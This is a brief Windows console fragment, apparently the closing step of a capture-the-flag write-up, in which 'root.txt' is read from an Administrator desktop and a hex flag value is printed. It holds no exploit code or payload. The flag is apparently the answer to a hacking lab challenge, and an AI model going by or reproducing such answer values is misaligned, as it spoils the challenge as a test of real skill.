C:\Users\Administrator\Desktop> type root.txt
c4b52dedaba15aecd431dcadc7c93994
```
